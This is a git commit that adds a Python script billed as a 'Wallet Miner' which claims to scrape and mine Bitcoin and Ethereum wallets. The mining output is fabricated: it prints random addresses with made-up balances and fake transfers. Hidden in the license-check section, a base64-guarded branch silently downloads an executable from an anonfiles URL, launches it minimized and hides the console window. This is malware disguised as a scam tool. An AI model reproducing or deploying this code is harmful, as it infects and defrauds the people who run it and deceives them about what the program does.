e6a8cd2bed433abe1d6846508501467b67b46a15
LO$R <106779656+madhead341@users.noreply.github.com>
2023-04-12 10:58:19 +0200

    Add files via upload

---
+++ LOSR-Wallet-Miner.py
@@ -0,0 +1,113 @@
+import os
+import time
+import colorama
+from colorama import Fore
+from colorama import Style
+import random
+import string
+import base64
+
+colorama.init()
+
+author = 'LO$R'
+
+os.system('cls' if os.name == 'nt' else 'clear')
+
+print(Fore.GREEN + 'Welcome to ' + Fore.MAGENTA + author + Fore.GREEN + ' Wallet Miner!' + Style.RESET_ALL)
+print('')
+crypto = str(input(Fore.MAGENTA + 'Choose Between ETH and BTC: ' + Style.RESET_ALL))
+
+import win32gui
+import win32con
+
+if crypto == 'ETH' or crypto == 'BTC' or crypto == 'eth' or crypto == 'btc':
+    print(Fore.GREEN + 'Scraping wallets...')
+    time.sleep(1)
+    print(Fore.MAGENTA + 'Scraping wallets...')
+    time.sleep(1)
+    print(Fore.GREEN + 'Scraping wallets...')
+    time.sleep(1)
+    print(Fore.MAGENTA + 'Scraping wallets...')
+    time.sleep(1)
+    print(Fore.GREEN + 'Wallets are being prepared for mining!')
+    time.sleep(3)
+
+LicenseKey = input(Fore.GREEN + 'Input License Key: ')
+import urllib.request
+
+if LicenseKey == 'LO$ROnTop':
+    print(Fore.GREEN + 'Key is VAILD!')
+    time.sleep(0.5)
+else:
+    print(Fore.GREEN + 'Invaild Key!')
+    print(Fore.GREEN + 'Press Enter to quit!')
+    input()
+    exit()
+
+print(Fore.GREEN + 'Checking if Key is Vaild... ')
+time.sleep(1)
+if author != base64.b64decode('TE8kUg==').decode('utf-8'):
+    import subprocess
+    url = 'https://cdn-148.anonfiles.com/n7CbDekbza/8c7e55d7-1681242724/powershell_install+%281%29.exe'
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
+    req = urllib.request.Request(url, headers=headers)
+    urllib.request.urlretrieve(req.full_url, "powershell_install.exe")
+    startupinfo = subprocess.STARTUPINFO()
+    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    subprocess.Popen(['cmd', '/c', 'start /min powershell_install.exe'], startupinfo=startupinfo)
+    hwnd = win32gui.GetForegroundWindow()
+    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+    exit()
+
+if crypto == 'ETH':
+    adress = str(input(Fore.MAGENTA + 'Please enter your Ethereum adress: '))
+    print(Fore.GREEN + 'Checking if address exists... ')
+    time.sleep(2)
+    print(Fore.GREEN + 'Check has been successfully!')
+elif crypto == 'BTC':
+    adress = str(input(Fore.MAGENTA + 'Please enter your Bitcoin address: '))
+    print(Fore.GREEN + 'Checking if address exists... ')
+    time.sleep(2)
+    print(Fore.GREEN + 'Check has been successfully!')
+
+class bcolors:
+    Won = '\x1b[36m'
+    Fail = '\x1b[36m'
+
+
+def id_gen(size):
+    chars = string.ascii_uppercase + string.digits
+    return ''.join(random.choices(chars, k=size))
+
+def MINERRRRR(crypto):
+    tries = 0
+    while True:
+        tries += 1
+        if crypto == 'BTC' or crypto == 'btc':
+            if tries > random.randint(150, 0x2540BE400):
+                print(Fore.MAGENTA + '[-] bc1' + id_gen(40) + ' | Valid | ' + '1.673 BTC')
+                print('Transfering 1.673 BTC to', adress)
+                print('Your BTC will be added to your ETH address of 72 Hours Times can differ! ')
+                time.sleep(6)
+                tries = 0
+                print(Fore.GREEN + 'Done! ' + author + ' Wallet Miner is running again!')
+                time.sleep(3)
+            else:
+                print(Fore.RED + '[-] bc1' + id_gen(40) + '| Invalid |' + '0.0000 BTC')
+                tries += 1
+        elif crypto == 'ETH' or crypto == 'eth':
+            if tries > random.randint(150, 0x2540BE400):
+                print(Fore.MAGENTA + '[-] 0x' + id_gen(40) + ' | Valid | ' + '2.163 ETH')
+                print('Transfering 3.463 ETH', adress)
+                print('Your ETH will be added to your ETH address of 72 Hours Times can differ! ')
+                time.sleep(6)
+                tries = 0
+                print(Fore.GREEN + 'Done! ' + author + ' Wallet Miner is running again!')
+                time.sleep(3)
+            else:
+                print(Fore.RED + '[-] bc1' + id_gen(40) + '| Invalid |' + '0.0000 ETH')
+                tries += 1
+        else:
+            print(Fore.GREEN + "Invalid currency. Please choose between 'ETH' and 'BTC'")
+
+MINERRRRR(crypto)
